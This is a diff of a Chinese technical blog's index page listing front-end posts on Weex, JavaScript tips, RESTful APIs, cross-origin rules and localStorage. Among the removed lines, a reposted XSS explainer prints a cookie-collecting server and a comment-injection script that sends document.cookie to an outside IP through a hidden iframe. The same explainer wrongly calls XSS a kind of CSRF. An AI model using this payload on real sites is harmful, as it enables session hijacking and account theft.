@@ -175,29 +175,159 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-初识mongodb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Weex首秀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/20/初识mongodb/">初识mongodb</a>
+      <a class="article-title" href="/blog/2017/01/25/Weex首秀/">Weex首秀(1)</a>
     </h1>
   
 
         
-        <a href="/blog/2017/01/20/初识mongodb/" class="archive-article-date">
-  	<time datetime="2017-01-20T01:14:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-20</time>
+        <a href="/blog/2017/01/25/Weex首秀/" class="archive-article-date">
+  	<time datetime="2017-01-25T01:59:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，但起码有一统江湖的感觉。</p>
-<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm i mongo</div></pre></td></tr></table></figure>
-<p>另外，还有一个非常重要的步骤，要在命令行中执行 mongod –dbpath “D:\vue\vue-wechat\server”  D:\vue\vue-wechat\server换成需要启动服务的位置，也就是你项目的server文件夹。这个命令相当于打开MONGODB的服务界面，让其进入服务状态。</p>
+        <p>一直想做一个APP，去年也自学过一段时间的<code>React Native</code>, 但是RN相对来说学习曲线比较陡峭，并且很多资源包在下载时都不是那么容易，经常error（这个大家都懂）, 所以这事儿就不了了之了。</p>
+<p>前两天看了weex的会议，觉得阿里又在放大招了，这个工具虽然目前学习社区不多，资源组件不丰富，但是本身调式来发非常便捷，weex playground非常不错，并且因为weex是基于vue的，所以入门简单，<code>npm run build</code>打包以后部署到自己的服务器上，用二维码扫描以后就可以拥有一个自己的APP了，并且是兼容三端的，这一点非常诱人。</p>
+<p>于是，我就从github上找到了一个别人的项目，<a href="https://github.com/dodola/WeexOne">https://github.com/dodola/WeexOne</a>，然后改造一个属于自己的APP。<br>总体样式如下：<br><img src="https://ganchengyuan1990.github.io/blog/img/weex.jpg" alt=""><br>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Vue</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2017/01/25/Weex首秀/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-javascript小技巧" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2017/01/24/javascript小技巧/">javascript小技巧</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2017/01/24/javascript小技巧/" class="archive-article-date">
+  	<time datetime="2017-01-24T02:52:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p><code>计算最小值</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">smallest</span>(<span class="params">array</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, array);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(smallest([<span class="number">9</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">33</span>])); <span class="comment">//7</span></div></pre></td></tr></table></figure></p>
+<p><code>巧用call方法</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function useCall() &#123;</div><div class="line">    [].forEach.call(arguments, function(val, key) &#123;</div><div class="line">        console.log(key, val)</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">useCall(&apos;Bob Dylan&apos;, &apos;Bob Marley&apos;, &apos;Steve Vai&apos;);//Bob Dylan, Bob Marley, Steve Vai</div></pre></td></tr></table></figure></p>
+</blockquote>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Javascript</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2017/01/24/javascript小技巧/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Restful-API初识" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2017/01/24/Restful-API初识/">Restful API初识</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2017/01/24/Restful-API初识/" class="archive-article-date">
+  	<time datetime="2017-01-24T01:57:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转载：<a href="http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/">http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/</a></p>
+<p>Restful API这个概念是我这几天看博客才接触到的，但其实在日常开发中这个思想始终都占据着重要地位。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>随着移动开发和前端开发的崛起，越来越多的 Web 后端应用都倾向于实现 Restful API。<br>Restful API 是一个简单易用的前后端分离方案，它只需要对客户端请求进行处理，然后返回结果即可， 无需考虑页面渲染，一定程度上减轻了后端开发人员的负担。<br>不过，这也意味着，有一些工作就必须由前端来完成了，比如错误处理。</p>
+<p>当 Restful API 需要抛出错误的时候，我们要考虑的是：这个错误应该包含哪些信息。<br>我们先看看 Github, Google, Facebook, Twitter, Twilio 的错误信息是怎样的。</p>
         
       
 
@@ -221,7 +351,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/20/初识mongodb/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2017/01/24/Restful-API初识/">展开全文 >></a>
         </p>
       
 
@@ -239,35 +369,30 @@
 
 
   
-    <article id="post-Js-载入defer和async方式的区别" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-跨域问题整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/19/Js-载入defer和async方式的区别/">Js 载入defer和async方式的区别</a>
+      <a class="article-title" href="/blog/2017/01/23/跨域问题整理/">跨域问题整理</a>
     </h1>
   
 
         
-        <a href="/blog/2017/01/19/Js-载入defer和async方式的区别/" class="archive-article-date">
-  	<time datetime="2017-01-19T06:06:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-19</time>
+        <a href="/blog/2017/01/23/跨域问题整理/" class="archive-article-date">
+  	<time datetime="2017-01-23T01:22:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-23</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。</p>
-<ol>
-<li>defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）</li>
-<li>它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的</li>
-<li>关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用</li>
-<li>async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行</li>
-<li>仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics</li>
-</ol>
-
+        <p>跨域，是一个前端开发者必须掌握的概念，这篇文章就从几个基本问题出发，来理解这个概念。</p>
+<h3 id="首先，什么是跨域？为何会有跨域？"><a href="#首先，什么是跨域？为何会有跨域？" class="headerlink" title="首先，什么是跨域？为何会有跨域？"></a>首先，什么是跨域？为何会有跨域？</h3><p>跨域一词从字面意思看，就是跨域名嘛，但实际上跨域的范围绝对不止那么狭隘。具体概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域。所以说，如果你的后端用的是NODEJS，然后端口设置采用了默认的3000，还是会产生跨域的。之所以会产生跨域这个问题呢，其实也很容易想明白，要是随便引用外部文件，不同标签下的页面引用类似的彼此的文件，浏览器很容易懵逼的，安全也得不到保障了就。什么事，都是安全第一嘛。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象（iframe之间）。下面是具体的跨域情况详解：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">URL                      <span class="comment">//说明       是否允许通信</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js     //同一域名下   允许</span></div><div class="line">http:<span class="comment">//www.a.com/lab/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/script/b.js //同一域名下不同文件夹 允许</span></div><div class="line">http:<span class="comment">//www.a.com:8000/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js     //同一域名，不同端口  不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">https:<span class="comment">//www.a.com/b.js //同一域名，不同协议 不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//70.32.92.74/b.js //域名和域名对应ip 不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//script.a.com/b.js //主域相同，子域不同 不允许（cookie这种情况下也不允许访问）</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//a.com/b.js //同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问）</span></div><div class="line">http:<span class="comment">//www.cnblogs.com/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js //不同域名 不允许</span></div></pre></td></tr></table></figure>
+        
       
 
       
@@ -290,7 +415,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/19/Js-载入defer和async方式的区别/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2017/01/23/跨域问题整理/">展开全文 >></a>
         </p>
       
 
@@ -308,230 +433,31 @@
 
 
   
-    <article id="post-XSS和CSRF对比" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-localStorage缓存机制" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/19/XSS和CSRF对比/">XSS和CSRF对比</a>
+      <a class="article-title" href="/blog/2017/01/22/localStorage缓存机制/">localStorage缓存机制</a>
     </h1>
   
 
         
-        <a href="/blog/2017/01/19/XSS和CSRF对比/" class="archive-article-date">
-  	<time datetime="2017-01-19T01:11:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-19</time>
+        <a href="/blog/2017/01/22/localStorage缓存机制/" class="archive-article-date">
+  	<time datetime="2017-01-22T01:26:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-22</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>
-
-<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
-<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">&lt;!-- more --&gt;</div><div class="line"></div><div class="line"></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
-<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
-<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/19/XSS和CSRF对比/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-html-render-paint" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
+        <p>首先，localStorage的确是可以做JS以及CSS缓存的，详情可以通过F12看<a href="http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735610010&amp;idx=1&amp;sn=67e3f0833f1097a279d850e2098956ff&amp;scene=0#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735610010&amp;idx=1&amp;sn=67e3f0833f1097a279d850e2098956ff&amp;scene=0#wechat_redirect</a></p>
+<p>按道理说这个机制是非常诱人的，毕竟localStorage可存储体积大，并且用户一旦开启便不容易清除，所以从工程师的角度来看这个工具非常适合缓存一些并不经常需要维护更新的脚本和样式文件。</p>
+<p>当然，假如要更新的话，就得好好设计一下更新机制，普通的资源请求，可以根据文件名+md5 <a href="http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。">http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。</a></p>
+<p>微信的做法是每个文件都单独维护一个localStorage变量，来记录版本号，从而由后台来判断是否需要更新。</p>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/18/html-render-paint/">html render &amp; paint（重排和重绘）</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/18/html-render-paint/" class="archive-article-date">
-  	<time datetime="2017-01-18T03:05:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。</p>
-<hr>
-<p>接下来进入正题，讲一讲昨天刚复习的有关<font color=red>浏览器页面渲染</font>的知识点。</p>
-<p>##repaint、reflow/relayout、restyle</p>
-<p>这四个概念分别代表什么？先来看一张图，了解一下浏览器页面的渲染过程<br><img src="https://ganchengyuan1990.github.io/blog/img/render.png" /></p>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">css</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/18/html-render-paint/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-vuex初探" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/17/vuex初探/">vuex初探</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/17/vuex初探/" class="archive-article-date">
-  	<time datetime="2017-01-17T02:27:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Vuex的作用是什么"><a href="#Vuex的作用是什么" class="headerlink" title="Vuex的作用是什么"></a>Vuex的作用是什么</h3><p>Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，需要一个帮手来帮助你进行组件管理，尤其是多层次的组件进行信息交互时，如果没有这样一个工具，就得维护公共变量或者一层一层传递参数，这个过程是非常令人不愉悦的。</p>
-<h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actions <span class="keyword">from</span> <span class="string">'./actions'</span>; <span class="comment">//改变状态都得通过这里的方法</span></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> getters <span class="keyword">from</span> <span class="string">'./getters'</span>; <span class="comment">//获取状态值的方法</span></div></pre></td></tr></table></figure>
-<h2 id="store对象"><a href="#store对象" class="headerlink" title="store对象"></a>store对象</h2><p>这个对象就是Vuex创建的实例对象，是重点需要学习的内容。</p>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Javascript</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Vue</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/17/vuex初探/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-javascript闭包个人理解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/17/javascript闭包个人理解/">javascript闭包个人理解</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/17/javascript闭包个人理解/" class="archive-article-date">
-  	<time datetime="2017-01-17T00:56:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">1</span>;</div><div class="line">    nAdd=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n+=<span class="number">1</span>; &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(n)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> inner;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = closure();</div><div class="line">result();</div><div class="line"></div><div class="line">nAdd();</div><div class="line">result(); <span class="comment">// 1000</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</div><div class="line">　　<span class="keyword">var</span> object = &#123;</div><div class="line">　　　　<span class="attr">name</span> : <span class="string">"My Object"</span>,</div><div class="line">　　　　<span class="attr">getNameFunc</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　　　<span class="keyword">return</span> <span class="keyword">this</span>.name;</div><div class="line">　　　　　　&#125;;</div><div class="line">　　　　&#125;</div><div class="line">　　&#125;;</div><div class="line">alert(object.getNameFunc()());</div></pre></td></tr></table></figure>
       
 
       
@@ -554,118 +480,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/17/javascript闭包个人理解/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-第一篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/16/第一篇/">Vue个人网站搭建</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/16/第一篇/" class="archive-article-date">
-  	<time datetime="2017-01-16T09:13:04.353Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>  自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。</p>
-<p>###手机预览(website)<br>  废话不多说，上预览，<a href="http://www.jasongan.cn">http://www.jasongan.cn</a></p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h1 id="install-dependencies"><a href="#install-dependencies" class="headerlink" title="install dependencies"></a>install dependencies</h1><p>npm install</p>
-<h1 id="serve-with-hot-reload-at-localhost-8080"><a href="#serve-with-hot-reload-at-localhost-8080" class="headerlink" title="serve with hot reload at localhost:8080"></a>serve with hot reload at localhost:8080</h1><p>npm run dev</p>
-<h1 id="build-for-production-with-minification"><a href="#build-for-production-with-minification" class="headerlink" title="build for production with minification"></a>build for production with minification</h1><p>npm run build</p>
-<p>```</p>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/16/第一篇/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/16/hello-world/">搭好了我的博客</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/16/hello-world/" class="archive-article-date">
-  	<time datetime="2017-01-16T08:12:12.622Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！<br>列一下这段时间准备研究的东西</p>
